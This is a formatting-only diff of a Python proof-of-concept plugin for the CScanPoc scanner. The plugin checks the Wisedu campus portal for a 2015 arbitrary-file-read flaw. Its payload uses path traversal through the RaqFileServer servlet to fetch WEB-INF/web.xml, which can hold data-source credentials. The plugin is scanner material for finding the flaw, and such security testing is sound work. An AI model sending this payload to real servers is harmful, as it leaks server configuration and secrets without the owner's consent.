@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Wisedu_0002' # 平台漏洞编号，留空
+    vuln_id = 'Wisedu_0002'  # 平台漏洞编号，留空
     name = '金智教育门户信息系统存在任意文件读取'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-06-18'  # 漏洞公布时间
     desc = '''
         江苏金智教育门户信息系统存在任意文件读取漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '金智教育CMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '1f51845c-ec3e-47d1-b53a-cf09ae493349'
@@ -32,13 +34,13 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #Refer:http://www.wooyun.org/bugs/wooyun-2015-0121332
+            # Refer:http://www.wooyun.org/bugs/wooyun-2015-0121332
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = arg + "/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml"
             code, head, res, errcode, _ = hh.http(payload)
 
-            if code ==200 and 'logConfig' in res and 'dataSource' in res:
+            if code == 200 and 'logConfig' in res and 'dataSource' in res:
                 #security_info(payload+':Any reading ' )
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -48,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
